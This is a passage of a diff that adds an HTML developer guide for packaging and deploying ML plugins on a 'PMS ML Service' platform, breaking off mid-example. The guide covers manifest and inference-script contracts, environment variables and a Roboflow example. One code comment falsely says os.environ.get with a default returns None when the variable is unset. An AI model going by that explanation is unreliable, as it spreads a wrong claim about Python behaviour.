@@ -1,0 +1,2207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>PMS ML Service — Plugin Developer Guide</title>
+  <style>
+    :root {
+      --bg: #0f1117;
+      --surface: #1a1d27;
+      --surface2: #22263a;
+      --border: #2e3347;
+      --accent: #6c63ff;
+      --accent2: #00d4aa;
+      --accent3: #ff6b6b;
+      --accent4: #ffd93d;
+      --text: #e2e8f0;
+      --muted: #8892a4;
+      --code-bg: #13151f;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: 'Segoe UI', system-ui, sans-serif; font-size: 15px; line-height: 1.7; }
+
+    /* Nav */
+    nav { position: fixed; top: 0; left: 0; width: 260px; height: 100vh; background: var(--surface); border-right: 1px solid var(--border); overflow-y: auto; padding: 24px 0; z-index: 100; }
+    nav .logo { padding: 0 20px 24px; border-bottom: 1px solid var(--border); margin-bottom: 16px; }
+    nav .logo h2 { font-size: 14px; font-weight: 700; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; }
+    nav .logo p { font-size: 11px; color: var(--muted); margin-top: 2px; }
+    nav ul { list-style: none; }
+    nav ul li a { display: block; padding: 7px 20px; color: var(--muted); text-decoration: none; font-size: 13px; border-left: 3px solid transparent; transition: all 0.15s; }
+    nav ul li a:hover, nav ul li a.active { color: var(--text); border-left-color: var(--accent); background: rgba(108,99,255,0.08); }
+    nav .section-label { padding: 16px 20px 4px; font-size: 10px; font-weight: 700; text-transform: uppercase; letter-spacing: 1.5px; color: var(--muted); }
+
+    /* Main */
+    main { margin-left: 260px; padding: 48px 56px; max-width: 1100px; }
+    section { margin-bottom: 80px; }
+    h1 { font-size: 36px; font-weight: 800; margin-bottom: 8px; }
+    h1 span { color: var(--accent); }
+    h2 { font-size: 26px; font-weight: 700; margin-bottom: 20px; padding-bottom: 12px; border-bottom: 1px solid var(--border); }
+    h3 { font-size: 18px; font-weight: 600; margin: 32px 0 12px; color: var(--accent2); }
+    h4 { font-size: 14px; font-weight: 600; margin: 20px 0 8px; text-transform: uppercase; letter-spacing: 0.5px; color: var(--muted); }
+    p { margin-bottom: 14px; color: #c8d0df; }
+
+    /* Hero */
+    .hero { background: linear-gradient(135deg, rgba(108,99,255,0.15), rgba(0,212,170,0.08)); border: 1px solid rgba(108,99,255,0.3); border-radius: 12px; padding: 40px; margin-bottom: 48px; }
+    .hero h1 { font-size: 42px; }
+    .hero p { font-size: 17px; color: var(--muted); max-width: 680px; }
+
+    /* Cards */
+    .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; margin: 24px 0; }
+    .card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 24px; }
+    .card .icon { font-size: 28px; margin-bottom: 12px; }
+    .card h3 { margin: 0 0 8px; font-size: 15px; color: var(--text); }
+    .card p { font-size: 13px; margin: 0; }
+
+    /* Code */
+    pre { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; padding: 20px; overflow-x: auto; margin: 16px 0; font-size: 13px; line-height: 1.6; }
+    code { font-family: 'Cascadia Code', 'Fira Code', monospace; }
+    pre code { color: #abb2bf; }
+    .kw { color: #c678dd; }
+    .fn { color: #61afef; }
+    .st { color: #98c379; }
+    .cm { color: #5c6370; font-style: italic; }
+    .nu { color: #d19a66; }
+    .cl { color: #e5c07b; }
+    .dt { color: #56b6c2; }
+    inline-code, code.inline { background: var(--code-bg); border: 1px solid var(--border); border-radius: 4px; padding: 2px 6px; font-size: 12px; font-family: monospace; color: var(--accent2); }
+
+    /* Badges */
+    .badge { display: inline-block; padding: 2px 10px; border-radius: 20px; font-size: 11px; font-weight: 600; }
+    .badge.required { background: rgba(255,107,107,0.15); color: #ff6b6b; border: 1px solid rgba(255,107,107,0.3); }
+    .badge.optional { background: rgba(0,212,170,0.1); color: var(--accent2); border: 1px solid rgba(0,212,170,0.25); }
+    .badge.type { background: rgba(108,99,255,0.15); color: var(--accent); border: 1px solid rgba(108,99,255,0.3); }
+
+    /* Tables */
+    table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 13px; }
+    th { background: var(--surface2); padding: 10px 14px; text-align: left; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: 0.5px; color: var(--muted); border-bottom: 1px solid var(--border); }
+    td { padding: 10px 14px; border-bottom: 1px solid var(--border); vertical-align: top; }
+    tr:last-child td { border-bottom: none; }
+    tr:hover td { background: rgba(255,255,255,0.02); }
+
+    /* Steps */
+    .steps { counter-reset: step; }
+    .step { display: flex; gap: 20px; margin-bottom: 32px; position: relative; }
+    .step::before { counter-increment: step; content: counter(step); min-width: 36px; height: 36px; background: var(--accent); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; font-size: 14px; flex-shrink: 0; }
+    .step-body h4 { color: var(--text); margin: 6px 0 8px; font-size: 15px; text-transform: none; letter-spacing: 0; }
+
+    /* Callouts */
+    .callout { border-radius: 8px; padding: 16px 20px; margin: 20px 0; border-left: 4px solid; }
+    .callout.info { background: rgba(108,99,255,0.08); border-color: var(--accent); }
+    .callout.warn { background: rgba(255,217,61,0.08); border-color: var(--accent4); }
+    .callout.tip { background: rgba(0,212,170,0.08); border-color: var(--accent2); }
+    .callout.danger { background: rgba(255,107,107,0.08); border-color: var(--accent3); }
+    .callout strong { display: block; margin-bottom: 4px; font-size: 12px; text-transform: uppercase; letter-spacing: 0.5px; }
+    .callout.info strong { color: var(--accent); }
+    .callout.warn strong { color: var(--accent4); }
+    .callout.tip strong { color: var(--accent2); }
+    .callout.danger strong { color: var(--accent3); }
+
+    /* File tree */
+    .tree { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; padding: 20px; font-family: monospace; font-size: 13px; line-height: 2; }
+    .tree .dir { color: #61afef; }
+    .tree .file { color: #abb2bf; }
+    .tree .req { color: #98c379; }
+    .tree .opt { color: #5c6370; }
+
+    /* Tabs */
+    .tabs { margin: 20px 0; }
+    .tab-buttons { display: flex; gap: 4px; border-bottom: 1px solid var(--border); margin-bottom: 0; }
+    .tab-btn { padding: 8px 18px; border: none; background: none; color: var(--muted); font-size: 13px; cursor: pointer; border-bottom: 2px solid transparent; margin-bottom: -1px; transition: all 0.15s; }
+    .tab-btn.active { color: var(--accent); border-bottom-color: var(--accent); }
+    .tab-content { display: none; border: 1px solid var(--border); border-top: none; border-radius: 0 0 8px 8px; }
+    .tab-content.active { display: block; }
+
+    /* Endpoint pills */
+    .endpoint { display: flex; align-items: center; gap: 12px; background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 12px 16px; margin: 8px 0; }
+    .method { font-size: 11px; font-weight: 700; padding: 3px 8px; border-radius: 4px; min-width: 52px; text-align: center; }
+    .method.post { background: rgba(0,212,170,0.15); color: var(--accent2); }
+    .method.get { background: rgba(108,99,255,0.15); color: var(--accent); }
+    .method.delete { background: rgba(255,107,107,0.15); color: var(--accent3); }
+    .endpoint code { font-size: 13px; color: var(--text); }
+    .endpoint span { font-size: 12px; color: var(--muted); margin-left: auto; }
+
+    /* Divider */
+    hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+
+    /* Anchor offset for fixed nav */
+    [id] { scroll-margin-top: 24px; }
+
+    /* Collapsible ZIP samples */
+    details { border: 1px solid var(--border); border-radius: 8px; margin: 12px 0; overflow: hidden; }
+    details summary { padding: 12px 16px; cursor: pointer; font-size: 13px; font-weight: 600; color: var(--accent2); background: var(--surface); user-select: none; list-style: none; display: flex; align-items: center; gap: 8px; }
+    details summary::before { content: '▶'; font-size: 10px; transition: transform 0.2s; flex-shrink: 0; }
+    details[open] summary::before { transform: rotate(90deg); }
+    details summary:hover { background: var(--surface2); }
+    details .details-body { padding: 0 16px 16px; background: var(--code-bg); }
+    details .details-body pre { margin: 12px 0 0; border: none; background: none; padding: 0; }
+
+    /* method badges */
+    .method.patch { background: rgba(255,217,61,0.15); color: var(--accent4); }
+    .method.delete2 { background: rgba(255,107,107,0.15); color: var(--accent3); }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="logo">
+    <h2>PMS ML Service</h2>
+    <p>Plugin Developer Guide</p>
+  </div>
+  <div class="section-label">Overview</div>
+  <ul>
+    <li><a href="#overview">Introduction</a></li>
+    <li><a href="#architecture">Architecture</a></li>
+    <li><a href="#plugin-types">Plugin Types</a></li>
+  </ul>
+  <div class="section-label">Pre-trained Plugins</div>
+  <ul>
+    <li><a href="#pretrained-overview">Overview</a></li>
+    <li><a href="#zip-structure">ZIP Structure</a></li>
+    <li><a href="#manifest">manifest.json Reference</a></li>
+    <li><a href="#inference-contract">Inference Script Contract</a></li>
+    <li><a href="#artifacts">Artifacts & Config</a></li>
+    <li><a href="#example-roboflow">Example: Roboflow Cloud</a></li>
+    <li><a href="#example-yolo">Example: Local YOLO</a></li>
+    <li><a href="#example-sklearn">Example: scikit-learn</a></li>
+    <li><a href="#deploy-api">Deployment API</a></li>
+  </ul>
+  <div class="section-label">Self-Training Plugins</div>
+  <ul>
+    <li><a href="#trainer-overview">Overview</a></li>
+    <li><a href="#base-trainer">BaseTrainer Contract</a></li>
+    <li><a href="#data-sources">Data Sources (15+)</a></li>
+    <li><a href="#trainer-lifecycle">Training Lifecycle</a></li>
+    <li><a href="#example-classifier">Example: Classifier</a></li>
+    <li><a href="#example-regressor">Example: Regressor</a></li>
+    <li><a href="#example-pytorch">Example: PyTorch</a></li>
+    <li><a href="#train-api">Training API</a></li>
+  </ul>
+  <div class="section-label">Auto-Training API</div>
+  <ul>
+    <li><a href="#auto-train-tabular">auto_train_tabular</a></li>
+    <li><a href="#auto-train-torch">auto_train_torch</a></li>
+    <li><a href="#training-config">Full TrainingConfig</a></li>
+    <li><a href="#config-presets">Config Presets</a></li>
+  </ul>
+  <div class="section-label">Security</div>
+  <ul>
+    <li><a href="#security-overview">Overview</a></li>
+    <li><a href="#ip-threat">IP Threat Detection</a></li>
+    <li><a href="#file-scanning">File Scanning</a></li>
+    <li><a href="#security-api">Security API</a></li>
+    <li><a href="#ip-threat-trainer">IP Threat Trainer</a></li>
+    <li><a href="#runtime-audit">Runtime Audit Hook</a></li>
+    <li><a href="#safe-http">SafeHttpClient</a></li>
+  </ul>
+  <div class="section-label">Monitoring</div>
+  <ul>
+    <li><a href="#monitoring-overview">Overview</a></li>
+    <li><a href="#performance-monitoring">Performance Monitoring</a></li>
+    <li><a href="#drift-detection">Data Drift Detection</a></li>
+  </ul>
+  <div class="section-label">Reference</div>
+  <ul>
+    <li><a href="#env-vars">Environment Variables</a></li>
+    <li><a href="#all-endpoints">All Endpoints</a></li>
+    <li><a href="#job-lifecycle">Job Lifecycle</a></li>
+    <li><a href="#troubleshooting">Troubleshooting</a></li>
+  </ul>
+</nav>
+
+<main>
+
+  <!-- ═══ HERO ═══ -->
+  <div class="hero">
+    <h1>PMS ML Service <span>Plugin Guide</span></h1>
+    <p>Build, package, and deploy custom machine learning models into the PMS platform — from cloud-based inference scripts to fully self-training models with custom data pipelines.</p>
+  </div>
+
+  <!-- ═══ OVERVIEW ═══ -->
+  <section id="overview">
+    <h2>Introduction</h2>
+    <p>The PMS ML Service is a production-grade model serving and training platform built on <strong>MLflow</strong>, <strong>Celery</strong>, and <strong>MinIO</strong>. It supports two distinct plugin types:</p>
+
+    <div class="card-grid">
+      <div class="card">
+        <div class="icon">📦</div>
+        <h3>Pre-trained Plugins</h3>
+        <p>Deploy an existing model — from a local file, HuggingFace Hub, S3, Roboflow, or any cloud API. No training step required. Package as a ZIP archive and upload.</p>
+      </div>
+      <div class="card">
+        <div class="icon">🧠</div>
+        <h3>Self-Training Plugins</h3>
+        <p>Write a <code class="inline">BaseTrainer</code> subclass with your own data pipeline, preprocessing, training loop, and evaluation logic. Upload the .py file — the platform handles scheduling, versioning, and serving.</p>
+      </div>
+    </div>
+
+    <div class="callout info">
+      <strong>Base URL</strong>
+      All ML service endpoints are at <code class="inline">http://&lt;host&gt;:8030/api/v1/</code>
+    </div>
+  </section>
+
+  <!-- ═══ ARCHITECTURE ═══ -->
+  <section id="architecture">
+    <h2>Architecture</h2>
+    <p>Every plugin goes through the same pipeline regardless of type:</p>
+    <pre><code><span class="cm">┌─────────────────────────────────────────────────────────────────┐</span>
+<span class="cm">│  Upload / Deploy Request (HTTP)                                  │</span>
+<span class="cm">│         ↓                                                        │</span>
+<span class="cm">│  ml-service (FastAPI :8030)                                      │</span>
+<span class="cm">│   • Validates ZIP / .py / URI                                    │</span>
+<span class="cm">│   • Creates TrainingJob in MongoDB (status: queued)              │</span>
+<span class="cm">│   • Enqueues Celery task → Redis broker                          │</span>
+<span class="cm">│         ↓                                                        │</span>
+<span class="cm">│  ml-worker (Celery)                                              │</span>
+<span class="cm">│   • Runs training or packaging                                   │</span>
+<span class="cm">│   • Logs model artifact → MLflow → MinIO (s3://pms-ml/)          │</span>
+<span class="cm">│   • Creates ModelDeployment in MongoDB (status: active)          │</span>
+<span class="cm">│         ↓                                                        │</span>
+<span class="cm">│  Inference (ml-service)                                          │</span>
+<span class="cm">│   • Loads model from MLflow registry                             │</span>
+<span class="cm">│   • Calls model.predict(inputs)                                  │</span>
+<span class="cm">│   • Saves results / images to MinIO                              │</span>
+<span class="cm">└─────────────────────────────────────────────────────────────────┘</span></code></pre>
+  </section>
+
+  <!-- ═══ PLUGIN TYPES ═══ -->
+  <section id="plugin-types">
+    <h2>Plugin Types at a Glance</h2>
+    <table>
+      <thead><tr><th>Feature</th><th>Pre-trained Plugin</th><th>Self-Training Plugin</th></tr></thead>
+      <tbody>
+        <tr><td>Package format</td><td>ZIP archive</td><td>Single .py file</td></tr>
+        <tr><td>Training step</td><td>None — model is pre-built</td><td>Defined in <code class="inline">train()</code></td></tr>
+        <tr><td>Required files</td><td>manifest.json + inference.py + model file</td><td>One .py with BaseTrainer subclass</td></tr>
+        <tr><td>Upload endpoint</td><td><code class="inline">POST /models/deploy-pretrained/zip</code></td><td><code class="inline">POST /trainers/upload</code></td></tr>
+        <tr><td>Trigger inference</td><td><code class="inline">POST /inference/{name}</code></td><td><code class="inline">POST /inference/{name}</code></td></tr>
+        <tr><td>MLflow model type</td><td><code class="inline">mlflow.pyfunc</code></td><td>Auto-detected per framework</td></tr>
+        <tr><td>Scheduling</td><td>Not applicable</td><td>Optional cron via <code class="inline">schedule</code> attr</td></tr>
+        <tr><td>Best for</td><td>External APIs, pre-built .pt/.pkl/ONNX, cloud models</td><td>Custom datasets, periodic retraining</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <hr>
+
+  <!-- ═══════════════════════════════════════════ -->
+  <!--              PRE-TRAINED PLUGINS             -->
+  <!-- ═══════════════════════════════════════════ -->
+
+  <section id="pretrained-overview">
+    <h2>Pre-trained Plugins</h2>
+    <p>A pre-trained plugin packages an already-trained model (or a call to a cloud ML API) into a ZIP archive that the platform can store, version, and serve. You define exactly how the model loads and runs inference — the platform handles everything else.</p>
+
+    <div class="callout tip">
+      <strong>Key Insight</strong>
+      The <code class="inline">model_file</code> in your manifest does NOT have to be a neural network weight file. It can be any file your inference script needs — a <code class="inline">config.json</code>, a <code class="inline">label_map.json</code>, or even a small SQLite database.
+    </div>
+  </section>
+
+  <!-- ZIP Structure -->
+  <section id="zip-structure">
+    <h2>ZIP Structure</h2>
+    <p>Both flat and nested layouts are supported. macOS Finder compress (which adds <code class="inline">__MACOSX/</code>) is handled automatically.</p>
+
+    <div class="card-grid">
+      <div class="card">
+        <h3>Flat Layout</h3>
+        <div class="tree">
+<span class="req">manifest.json</span>       ← required<br>
+<span class="req">inference.py</span>         ← required<br>
+<span class="req">model.pt</span>             ← your model_file<br>
+<span class="opt">artifacts/</span>           ← optional extras<br>
+<span class="opt">  └── scaler.pkl</span><br>
+<span class="opt">  └── labels.json</span>
+        </div>
+        <p style="font-size:12px;margin-top:8px;">Create: <code class="inline">zip -r model.zip manifest.json inference.py model.pt</code></p>
+      </div>
+      <div class="card">
+        <h3>Nested Layout (recommended)</h3>
+        <div class="tree">
+<span class="dir">my-model/</span><br>
+<span class="req">  ├── manifest.json</span><br>
+<span class="req">  ├── inference.py</span><br>
+<span class="req">  ├── model.pt</span><br>
+<span class="opt">  ├── utils.py</span>         ← importable!<br>
+<span class="opt">  └── artifacts/</span><br>
+<span class="opt">      └── scaler.pkl</span>
+        </div>
+        <p style="font-size:12px;margin-top:8px;">Create: <code class="inline">zip -r model.zip my-model/</code></p>
+      </div>
+    </div>
+
+    <div class="callout info">
+      <strong>Sibling imports</strong>
+      Any <code class="inline">.py</code> file in the same directory as <code class="inline">inference.py</code> is automatically bundled and importable. Use this to split large models into multiple files.
+    </div>
+  </section>
+
+  <!-- manifest.json -->
+  <section id="manifest">
+    <h2>manifest.json Reference</h2>
+    <pre><code>{
+    <span class="st">"name"</span>:           <span class="st">"my-model"</span>,          <span class="cm">// REQUIRED — unique trainer name (slug format)</span>
+    <span class="st">"model_file"</span>:     <span class="st">"model.pt"</span>,          <span class="cm">// REQUIRED — path relative to ZIP root</span>
+    <span class="st">"version"</span>:        <span class="st">"1.0.0"</span>,             <span class="cm">// optional, default "1.0.0"</span>
+    <span class="st">"description"</span>:    <span class="st">"What this model does"</span>, <span class="cm">// optional</span>
+    <span class="st">"entry_point"</span>:    <span class="st">"inference.py"</span>,      <span class="cm">// optional, default "inference.py"</span>
+    <span class="st">"set_as_default"</span>: <span class="kw">true</span>,                 <span class="cm">// optional, makes this the active version</span>
+    <span class="st">"tags"</span>: {                               <span class="cm">// optional — MLflow tags</span>
+        <span class="st">"domain"</span>: <span class="st">"utilities"</span>,
+        <span class="st">"type"</span>:   <span class="st">"ocr"</span>
+    },
+    <span class="st">"input_schema"</span>: {                       <span class="cm">// optional but strongly recommended</span>
+        <span class="st">"type"</span>:        <span class="st">"object"</span>,
+        <span class="st">"description"</span>: <span class="st">"What inputs this model expects"</span>,
+        <span class="st">"fields"</span>: {
+            <span class="st">"image_b64"</span>: {
+                <span class="st">"type"</span>:        <span class="st">"string"</span>,
+                <span class="st">"format"</span>:      <span class="st">"base64"</span>,
+                <span class="st">"required"</span>:    <span class="kw">true</span>,
+                <span class="st">"description"</span>: <span class="st">"Base64-encoded JPEG/PNG"</span>
+            }
+        },
+        <span class="st">"example"</span>: { <span class="st">"image_b64"</span>: <span class="st">"&lt;base64&gt;"</span> }
+    }
+}</code></pre>
+
+    <table>
+      <thead><tr><th>Field</th><th>Status</th><th>Type</th><th>Notes</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">name</code></td><td><span class="badge required">required</span></td><td>string</td><td>Unique identifier. Used as MLflow model name and inference URL segment. Use kebab-case.</td></tr>
+        <tr><td><code class="inline">model_file</code></td><td><span class="badge required">required</span></td><td>string</td><td>Path to primary artifact relative to ZIP root. Can be any file type.</td></tr>
+        <tr><td><code class="inline">version</code></td><td><span class="badge optional">optional</span></td><td>string</td><td>SemVer string. Defaults to <code class="inline">"1.0.0"</code>.</td></tr>
+        <tr><td><code class="inline">description</code></td><td><span class="badge optional">optional</span></td><td>string</td><td>Human-readable description stored in the deployment record.</td></tr>
+        <tr><td><code class="inline">entry_point</code></td><td><span class="badge optional">optional</span></td><td>string</td><td>Relative path to your inference script. Defaults to <code class="inline">"inference.py"</code>.</td></tr>
+        <tr><td><code class="inline">set_as_default</code></td><td><span class="badge optional">optional</span></td><td>boolean</td><td>If true, this version becomes the default for inference calls. Defaults to true.</td></tr>
+        <tr><td><code class="inline">tags</code></td><td><span class="badge optional">optional</span></td><td>object</td><td>Key-value tags stored in MLflow and the deployment record.</td></tr>
+        <tr><td><code class="inline">input_schema</code></td><td><span class="badge optional">optional</span></td><td>object</td><td>Served via <code class="inline">GET /inference/{name}/schema</code>. Tells callers exactly what to send.</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- Inference Contract -->
+  <section id="inference-contract">
+    <h2>Inference Script Contract</h2>
+    <p>Your <code class="inline">inference.py</code> must define exactly one class that inherits from <code class="inline">mlflow.pyfunc.PythonModel</code> and implements two methods:</p>
+
+    <pre><code><span class="kw">import</span> mlflow.pyfunc
+
+<span class="kw">class</span> <span class="cl">MyModel</span>(mlflow.pyfunc.<span class="cl">PythonModel</span>):
+
+    <span class="kw">def</span> <span class="fn">load_context</span>(<span class="dt">self</span>, context):
+        <span class="cm">"""
+        Called ONCE when the model is loaded for the first time.
+        Use this to:
+          • Load the model weights / config
+          • Resolve environment variables (API keys, endpoints)
+          • Initialize expensive resources (DB connections, HTTP clients)
+
+        context.artifacts["model_file"]  → absolute path to your model_file
+        context.artifacts["my_artifact"] → absolute path to artifacts/my_artifact
+        """</span>
+        <span class="kw">import</span> os
+        <span class="dt">self</span>.threshold = <span class="nu">0.5</span>
+        <span class="dt">self</span>.api_key = os.environ.get(<span class="st">"MY_API_KEY"</span>) <span class="kw">or</span> <span class="st">"default"</span>
+        <span class="cm"># load your model here:</span>
+        <span class="cm"># self.model = load_something(context.artifacts["model_file"])</span>
+
+    <span class="kw">def</span> <span class="fn">predict</span>(<span class="dt">self</span>, context, model_input):
+        <span class="cm">"""
+        Called on EVERY inference request.
+        model_input: whatever the caller sends in "inputs" (dict, list, DataFrame, etc.)
+        Returns: any JSON-serializable value (dict, list, str, number)
+        """</span>
+        row = <span class="dt">self</span>._to_dict(model_input)
+        <span class="cm"># run inference...</span>
+        <span class="kw">return</span> {<span class="st">"result"</span>: <span class="st">"..."</span>}
+
+    <span class="kw">def</span> <span class="fn">_to_dict</span>(<span class="dt">self</span>, model_input) -> <span class="cl">dict</span>:
+        <span class="cm">"""Helper — handles both dict and DataFrame inputs."""</span>
+        <span class="kw">if</span> hasattr(model_input, <span class="st">"to_dict"</span>):
+            <span class="kw">return</span> model_input.iloc[<span class="nu">0</span>].to_dict() <span class="kw">if</span> <span class="fn">len</span>(model_input) <span class="kw">else</span> {}
+        <span class="kw">return</span> <span class="fn">dict</span>(model_input)</code></pre>
+
+    <h3>Environment Variable Pattern</h3>
+    <p>Always resolve credentials in <code class="inline">load_context</code>, never at module level. Use <code class="inline">or</code> fallbacks so <code class="inline">None</code> doesn't silently pass through:</p>
+    <pre><code><span class="kw">def</span> <span class="fn">load_context</span>(<span class="dt">self</span>, context):
+    <span class="kw">import</span> os
+    <span class="cm"># ✅ Correct — "or" fallback ensures None becomes the default</span>
+    <span class="dt">self</span>.api_key = os.environ.get(<span class="st">"MY_API_KEY"</span>) <span class="kw">or</span> <span class="st">"fallback"</span>
+
+    <span class="cm"># ❌ Wrong — get() returns None if var not set; boto3 ignores None</span>
+    <span class="cm"># self.api_key = os.environ.get("MY_API_KEY", "fallback")</span></code></pre>
+
+    <h3>Standard Environment Variables Available</h3>
+    <table>
+      <thead><tr><th>Variable</th><th>Value</th><th>Use for</th></tr></thead>
+      <tbody>
+        <tr><td><code class="inline">S3_ENDPOINT_URL</code></td><td><code class="inline">http://minio:9000</code></td><td>Internal MinIO uploads</td></tr>
+        <tr><td><code class="inline">S3_PUBLIC_ENDPOINT_URL</code></td><td><code class="inline">http://localhost:9000</code></td><td>Presigned URLs for browser access</td></tr>
+        <tr><td><code class="inline">S3_ACCESS_KEY</code></td><td><code class="inline">minioadmin</code></td><td>MinIO credentials</td></tr>
+        <tr><td><code class="inline">S3_SECRET_KEY</code></td><td><code class="inline">minioadmin</code></td><td>MinIO credentials</td></tr>
+        <tr><td><code class="inline">S3_BUCKET</code></td><td><code class="inline">pms-ml</code></td><td>Default storage bucket</td></tr>
+        <tr><td><code class="inline">ROBOFLOW_API_KEY</code></td><td>—</td><td>Roboflow cloud inference</td></tr>
+        <tr><td><code class="inline">MLFLOW_TRACKING_URI</code></td><td><code class="inline">http://mlflow:5000</code></td><td>MLflow server</td></tr>
+      </tbody>
+    </table>
+  </section>
+
+  <!-- Artifacts -->
+  <section id="artifacts">
+    <h2>Artifacts & Extra Config Files</h2>
+    <p>Any files placed in the <code class="inline">artifacts/</code> directory of your ZIP are automatically registered and available in <code class="inline">load_context</code>:</p>
+    <pre><code><span class="cm"># ZIP layout:</span>
+<span class="cm"># my-model/manifest.json          model_file: "model.pt"</span>
+<span class="cm"># my-model/model.pt</span>
+<span class="cm"># my-model/artifacts/scaler.pkl</span>
+<span class="cm"># my-model/artifacts/label_map.json</span>
+
+<span class="kw">def</span> <span class="fn">load_context</span>(<span class="dt">self</span>, context):
+    <span class="kw">import</span> joblib, json
+
+    <span class="dt">self</span>.model   = joblib.load(context.artifacts[<span class="st">"model_file"</span>])
+    <span class="dt">self</span>.scaler  = joblib.load(context.artifacts[<span class="st">"scaler"</span>])        <span class="cm"># key = filename without extension</span>
+    <span class="dt">self</span>.labels  = json.load(<span class="fn">open</span>(context.artifacts[<span class="st">"label_map"</span>]))</code></pre>
+
+    <div class="callout warn">
+      <strong>Artifact keys</strong>
+      The key in <code class="inline">context.artifacts</code> is the filename <strong>without its extension</strong>. <code class="inline">scaler.pkl</code> → key <code class="inline">"scaler"</code>, <code class="inline">label_map.json</code> → key <code class="inline">"label_map"</code>.
+    </div>
+  </section>
+
+  <!-- Example: Roboflow -->
+  <section id="example-roboflow">
+    <h2>Example: Roboflow Cloud Model (no local model file)</h2>
+    <p>When your model runs entirely on a cloud API, use a <code class="inline">config.json</code> as the <code class="inline">model_file</code> to store connection settings.</p>
+
+    <details>
+      <summary>📁 ZIP file contents — click to expand</summary>
+      <div class="details-body">
+        <div class="tree" style="margin-top:12px">
+<span class="dir">my-roboflow-model/</span><br>
+<span class="req">  ├── manifest.json</span><br>
+<span class="req">  ├── inference.py</span><br>
+<span class="req">  └── config.json</span>          ← used as model_file<br>
+        </div>
+        <p style="font-size:12px;margin-top:8px;color:var(--muted)">Build: <code class="inline">zip -r my_roboflow.zip my-roboflow-model/</code></p>
+
+        <h4 style="margin-top:16px">config.json</h4>
+        <pre><code>{
+    <span class="st">"api_url"</span>:  <span class="st">"https://serverless.roboflow.com"</span>,
+    <span class="st">"model_id"</span>: <span class="st">"my-project/1"</span>
+}</code></pre>
+
+        <h4>manifest.json</h4>
+        <pre><code>{
+    <span class="st">"name"</span>:        <span class="st">"my-roboflow-model"</span>,
+    <span class="st">"version"</span>:     <span class="st">"1.0.0"</span>,
+    <span class="st">"model_file"</span>:  <span class="st">"config.json"</span>,
+    <span class="st">"entry_point"</span>: <span class="st">"inference.py"</span>
+}</code></pre>
+      </div>
+    </details>
+
+    <h3>inference.py</h3>
+    <pre><code><span class="kw">import</span> io, json, os, base64
+<span class="kw">import</span> mlflow.pyfunc
+
+
+<span class="kw">class</span> <span class="cl">MyRoboflowModel</span>(mlflow.pyfunc.<span class="cl">PythonModel</span>):
+
+    <span class="kw">def</span> <span class="fn">load_context</span>(<span class="dt">self</span>, context):
+        <span class="kw">with</span> <span class="fn">open</span>(context.artifacts[<span class="st">"model_file"</span>]) <span class="kw">as</span> f:
+            cfg = json.load(f)
+        <span class="dt">self</span>.api_url  = cfg[<span class="st">"api_url"</span>]
+        <span class="dt">self</span>.model_id = cfg[<span class="st">"model_id"</span>]
+        <span class="dt">self</span>.api_key  = os.environ.get(<span class="st">"ROBOFLOW_API_KEY"</span>) <span class="kw">or</span> <span class="st">""</span>
+
+    <span class="kw">def</span> <span class="fn">predict</span>(<span class="dt">self</span>, context, model_input):
+        <span class="kw">from</span> inference_sdk <span class="kw">import</span> InferenceHTTPClient
+        <span class="kw">from</span> PIL <span class="kw">import</span> Image
+
+        row = <span class="dt">self</span>._to_dict(model_input)
+        img_bytes = base64.b64decode(row[<span class="st">"image_b64"</span>])
+        pil_img   = Image.<span class="fn">open</span>(io.<span class="cl">BytesIO</span>(img_bytes)).convert(<span class="st">"RGB"</span>)
+
+        client = <span class="cl">InferenceHTTPClient</span>(
+            api_url=<span class="dt">self</span>.api_url,
+            api_key=row.get(<span class="st">"api_key"</span>) <span class="kw">or</span> <span class="dt">self</span>.api_key,
+        )
+        raw = client.infer(pil_img, model_id=<span class="dt">self</span>.model_id)
+        <span class="kw">return</span> raw.get(<span class="st">"predictions"</span>, [])
+
+    <span class="kw">def</span> <span class="fn">_to_dict</span>(<span class="dt">self</span>, m):
+        <span class="kw">return</span> m.iloc[<span class="nu">0</span>].to_dict() <span class="kw">if</span> hasattr(m, <span class="st">"to_dict"</span>) <span class="kw">else</span> <span class="fn">dict</span>(m)</code></pre>
+
+    <h3>Deploy</h3>
+    <pre><code><span class="cm"># Build the ZIP</span>
+zip -r my_roboflow.zip config.json manifest.json inference.py
+
+<span class="cm"># Upload and deploy</span>
+curl -X POST http://localhost:8030/api/v1/models/deploy-pretrained/zip \
+  -F <span class="st">"file=@my_roboflow.zip"</span>
+
+<span class="cm"># Run inference</span>
+curl -X POST http://localhost:8030/api/v1/inference/my-roboflow-model/upload \
+  -F <span class="st">"file=@image.jpg"</span> \
+  -F <span class="st">'extra={"api_key": "YOUR_KEY"}'</span></code></pre>
+  </section>
+
+  <!-- Example: YOLO -->
+  <section id="example-yolo">
+    <h2>Example: Local YOLO / PyTorch Model</h2>
+    <p>Package a <code class="inline">.pt</code> weights file with an inference script that loads it locally.</p>
+
+    <details>
+      <summary>📁 ZIP file contents — click to expand</summary>
+      <div class="details-body">
+        <div class="tree" style="margin-top:12px">
+<span class="dir">my-detector/</span><br>
+<span class="req">  ├── manifest.json</span><br>
+<span class="req">  ├── inference.py</span><br>
+<span class="req">  └── model.pt</span>             ← YOLO weights<br>
+        </div>
+        <p style="font-size:12px;margin-top:8px;color:var(--muted)">Build: <code class="inline">zip -r my_detector.zip my-detector/</code> — <strong>model.pt is not included in the repo</strong>, add your weights file before zipping.</p>
+
+        <h4 style="margin-top:16px">manifest.json</h4>
+        <pre><code>{
